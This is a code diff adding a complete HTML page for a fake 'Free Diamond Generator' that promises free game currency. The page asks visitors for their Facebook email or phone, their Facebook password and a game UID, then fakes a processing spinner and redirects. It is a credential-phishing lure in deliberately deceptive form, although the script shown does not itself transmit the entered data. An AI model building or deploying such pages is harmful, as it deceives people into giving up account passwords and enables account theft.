@@ -1,0 +1,143 @@
+<html><head><base href="https://example.com/">
+<title>Free Diamond Generator</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+* { 
+  box-sizing: border-box;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+body {
+  margin: 0;
+  padding: 20px;
+  background: linear-gradient(45deg, #1a237e, #311b92);
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+.container {
+  background: rgba(255, 255, 255, 0.9);
+  border-radius: 15px;
+  padding: 20px;
+  max-width: 400px;
+  width: 100%;
+  box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+}
+
+h1 {
+  color: #fff;
+  text-align: center;
+  text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+}
+
+.diamond-icon {
+  width: 100px;
+  height: 100px;
+  margin: 0 auto;
+  display: block;
+}
+
+input {
+  width: 100%;
+  padding: 12px;
+  margin: 8px 0;
+  border: 2px solid #3f51b5;
+  border-radius: 8px;
+  font-size: 16px;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  background: #3f51b5;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  font-size: 16px;
+  cursor: pointer;
+  margin-top: 10px;
+  transition: all 0.3s ease;
+}
+
+button:hover {
+  background: #283593;
+  transform: translateY(-2px);
+}
+
+.loading {
+  display: none;
+  text-align: center;
+  margin-top: 20px;
+}
+
+.spinner {
+  width: 40px;
+  height: 40px;
+  margin: 0 auto;
+  border: 4px solid #f3f3f3;
+  border-top: 4px solid #3f51b5;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.diamond-count {
+  font-size: 24px;
+  color: #3f51b5;
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+</style>
+</head>
+<body>
+
+<h1>💎 Free Diamond Generator 💎</h1>
+
+<div class="container">
+  <svg class="diamond-icon" viewBox="0 0 100 100">
+    <path fill="#00bcd4" d="M50 0 L100 35 L50 100 L0 35 Z">
+      <animate attributeName="fill" values="#00bcd4;#18ffff;#00bcd4" dur="2s" repeatCount="indefinite"/>
+    </path>
+  </svg>
+  
+  <div class="diamond-count">
+    Generate up to 99,999 Diamonds!
+  </div>
+
+  <form id="generatorForm" onsubmit="return processForm(event)">
+    <input type="text" placeholder="Facebook Email/Phone" required>
+    <input type="password" placeholder="Facebook Password" required>
+    <input type="text" placeholder="Game UID" required>
+    <button type="submit">Get Free Diamonds Now!</button>
+  </form>
+
+  <div class="loading" id="loadingSection">
+    <div class="spinner"></div>
+    <p>Processing your request...</p>
+  </div>
+</div>
+
+<script>
+function processForm(e) {
+  e.preventDefault();
+  document.getElementById('generatorForm').style.display = 'none';
+  document.getElementById('loadingSection').style.display = 'block';
+  
+  setTimeout(() => {
+    window.location.href = 'https://example.com/processing';
+  }, 3000);
+  
+  return false;
+}
+</script>
+
+</body>
+</html>
